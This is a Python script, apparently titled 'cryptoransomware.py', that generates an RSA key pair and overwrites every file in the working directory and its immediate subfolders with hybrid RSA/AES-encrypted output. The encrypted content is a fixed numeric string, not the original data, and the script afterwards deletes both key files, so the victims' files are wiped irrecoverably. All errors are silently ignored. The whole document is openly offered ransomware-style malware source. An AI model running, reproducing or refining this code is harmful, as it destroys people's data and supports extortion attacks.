from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
import os
import glob

pasta = os.getcwd()
arr = os.listdir(pasta)
key = RSA.generate(2048)
private_key = key.export_key()

file_out = open("private.pem", "wb")
file_out.write(private_key)
file_out.close()

public_key = key.publickey().export_key()
file_out = open("receiver.pem", "wb")
file_out.write(public_key)
file_out.close()


for arquivos in arr:
    if arquivos == 'cryptoransomware.py' or arquivos == "receiver.pem" or arquivos == "private.pem":
        continue

    elif '.' not in arquivos:
        try:
            path = arquivos
            x = os.listdir(path)
            oss = os.getcwd()
            for y in x:
                newpath = f'{oss}/{arquivos}/{y}'
                if '.' not in newpath:
                    continue

                elif 'desktop.ini' in newpath:
                    continue

                data = "813749508643195871985649038619850071398457328965891234073489659382174189659032147".encode("utf-8")
                file_out = open(newpath, "wb")

                recipient_key = RSA.import_key(open("receiver.pem").read())
                session_key = get_random_bytes(16)

                cipher_rsa = PKCS1_OAEP.new(recipient_key)
                enc_session_key = cipher_rsa.encrypt(session_key)

                cipher_aes = AES.new(session_key, AES.MODE_EAX)
                ciphertext, tag = cipher_aes.encrypt_and_digest(data)
                [file_out.write(x) for x in (enc_session_key, cipher_aes.nonce, tag, ciphertext)]
                file_out.close()
        except:
            None
    else:
        try:
            data = "813749508643195871985649038619850071398457328965891234073489659382174189659032147".encode("utf-8")
            file_out = open(arquivos, "wb")

            recipient_key = RSA.import_key(open("receiver.pem").read())
            session_key = get_random_bytes(16)

            cipher_rsa = PKCS1_OAEP.new(recipient_key)
            enc_session_key = cipher_rsa.encrypt(session_key)

            cipher_aes = AES.new(session_key, AES.MODE_EAX)
            ciphertext, tag = cipher_aes.encrypt_and_digest(data)
            [file_out.write(x) for x in (enc_session_key, cipher_aes.nonce, tag, ciphertext)]
            file_out.close()
        except:
            None

os.remove("receiver.pem")
os.remove("private.pem")


